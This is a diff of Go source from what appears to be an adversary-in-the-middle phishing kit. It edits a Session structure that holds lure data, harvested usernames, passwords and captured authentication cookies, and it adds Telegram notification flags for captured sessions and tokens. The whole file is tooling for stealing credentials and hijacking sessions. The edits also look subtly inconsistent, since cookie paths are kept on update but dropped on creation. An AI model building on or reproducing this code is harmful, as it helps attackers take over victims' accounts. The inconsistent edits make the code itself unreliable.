@@ -7,63 +7,55 @@ import (
 )
 
 type Session struct {
-	Id             string
-	Name           string
-	Username       string
-	Password       string
-	Custom         map[string]string
-	Params         map[string]string
-	BodyTokens     map[string]string
-	HttpTokens     map[string]string
-	CookieTokens   map[string]map[string]*database.CookieToken
-	RedirectURL    string
-	IsDone         bool
-	IsAuthUrl      bool
-	IsForwarded    bool
-	ProgressIndex  int
-	RedirectCount  int
-	PhishLure            *Lure
-	RedirectorName       string
-	LureDirPath          string
-	PostRedirectorName   string
-	PostLureDirPath      string
-	PostRedirectorServed bool
-	DoneSignal           chan struct{}
-	RemoteAddr           string
-	UserAgent            string
-	TelegramExported     bool // Track if session was already exported to Telegram
-	IsCaptchaVerified    bool // Track if CAPTCHA was verified for this session
-	GatherDelayPending   bool // True while cookie gather delay goroutine is running
+	Id              string
+	Name            string
+	Username        string
+	Password        string
+	Custom          map[string]string
+	Params          map[string]string
+	BodyTokens      map[string]string
+	HttpTokens      map[string]string
+	CookieTokens    map[string]map[string]*database.CookieToken
+	RedirectURL     string
+	IsDone          bool
+	IsAuthUrl       bool
+	IsForwarded     bool
+	ProgressIndex   int
+	RedirectCount   int
+	PhishLure       *Lure
+	RedirectorName  string
+	LureDirPath     string
+DoneSignal       chan struct{}
+	RemoteAddr       string
+	UserAgent        string
+	TelegramNotified           bool
+	TokensTelegramNotified    bool
 }
 
 func NewSession(name string) (*Session, error) {
 	s := &Session{
-		Id:             GenRandomToken(),
-		Name:           name,
-		Username:       "",
-		Password:       "",
-		Custom:         make(map[string]string),
-		Params:         make(map[string]string),
-		BodyTokens:     make(map[string]string),
-		HttpTokens:     make(map[string]string),
-		RedirectURL:    "",
-		IsDone:         false,
-		IsAuthUrl:      false,
-		IsForwarded:    false,
-		ProgressIndex:  0,
-		RedirectCount:  0,
-		PhishLure:            nil,
-		RedirectorName:       "",
-		LureDirPath:          "",
-		PostRedirectorName:   "",
-		PostLureDirPath:      "",
-		PostRedirectorServed: false,
-		DoneSignal:           make(chan struct{}),
-		RemoteAddr:           "",
-		UserAgent:            "",
-		TelegramExported:     false,
-		IsCaptchaVerified:    false,
-		GatherDelayPending:   false,
+		Id:               GenRandomToken(),
+		Name:             name,
+		Username:         "",
+		Password:         "",
+		Custom:           make(map[string]string),
+		Params:           make(map[string]string),
+		BodyTokens:       make(map[string]string),
+		HttpTokens:       make(map[string]string),
+		RedirectURL:     "",
+		IsDone:           false,
+		IsAuthUrl:        false,
+		IsForwarded:      false,
+		ProgressIndex:   0,
+		RedirectCount:    0,
+		PhishLure:       nil,
+		RedirectorName:  "",
+		LureDirPath:      "",
+		DoneSignal:       make(chan struct{}),
+		RemoteAddr:       "",
+		UserAgent:        "",
+		TelegramNotified:           false,
+		TokensTelegramNotified:    false,
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
@@ -82,7 +74,7 @@ func (s *Session) SetCustom(name string, value string) {
 	s.Custom[name] = value
 }
 
-func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, secure bool, expires time.Time) {
+func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
 	if _, ok := s.CookieTokens[domain]; !ok {
 		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
@@ -92,14 +84,11 @@ func (s *Session) AddCookieAuthToken(domain string, key string, value string, pa
 		tk.Value = value
 		tk.Path = path
 		tk.HttpOnly = http_only
-		tk.Secure = secure
 	} else {
 		s.CookieTokens[domain][key] = &database.CookieToken{
 			Name:     key,
 			Value:    value,
-			Path:     path,
 			HttpOnly: http_only,
-			Secure:   secure,
 		}
 	}
 
@@ -108,6 +97,7 @@ func (s *Session) AddCookieAuthToken(domain string, key string, value string, pa
 func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
 	tcopy := make(map[string][]CookieAuthToken)
 	for k, v := range authTokens {
+		tcopy[k] = []CookieAuthToken{}
 		for _, at := range v {
 			if !at.optional {
 				tcopy[k] = append(tcopy[k], *at)
